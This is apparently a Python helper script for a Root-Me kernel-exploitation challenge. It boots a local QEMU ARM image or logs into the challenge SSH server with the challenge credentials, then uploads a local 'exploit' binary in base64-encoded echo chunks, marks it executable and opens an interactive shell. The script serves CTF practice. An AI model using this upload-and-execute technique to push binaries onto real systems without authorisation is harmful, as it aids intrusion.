#!/usr/bin/python

from pexpect import pxssh
from pwn import *
import base64
import sys
import os


print("[*] Connection...")

if len(sys.argv)>1:
    qemu = True
    s = process(["qemu-system-arm", "-m", "32M", "-M", "vexpress-a9", "-kernel", "vmlinuz", "-dtb", "vexpress-v2p-ca9.dtb", "-initrd", "initramfs.img", "-append", "console=ttyAMA0,115200 oops=panic panic=1 loglevel=0", "-nographic", "-s"])
else:
    qemu = False
    s = pxssh.pxssh()
    s.login("challenge03.root-me.org", "app-systeme-ch60", "app-systeme-ch60", port=2223)
    s.sendline("./run")

VM_EXPECT = "@linkern-chall"
print("[+] Connected")

def expect(s):
    if qemu:
        s.recvuntil(VM_EXPECT)
    else:
        s.expect(VM_EXPECT)

def send_file():
    f = open("exploit","rb")
    f2 = "/home/user/exploit"

    print("[*] Preparing the exploit transfert...")
    s.sendline("echo -n '' > {}".format(f2))

    expect(s)
    s.sendline("rm calc")
    expect(s)

    print("[*] Transfering the file...")
    size = os.path.getsize('exploit')
    cks = 512
    toSend = f.read(cks)
    i = 0
    while(len(toSend)!=0):
        avancement = (float(i*cks)/float(size))*100
        print(str(avancement)+"% ")
        s.sendline("echo '{}'| base64 -d >> {} ".format(base64.b64encode(toSend).decode(),f2))
        expect(s)
        toSend = f.read(cks)
        i+=1
    print("[+]\tDone")


send_file()
print("[*] Interactive shell on the virtual machine... just run the exploit")
s.sendline("chmod u+x /home/user/exploit")
if qemu:
    s.interactive()
else:
    s.interact()
    s.close()
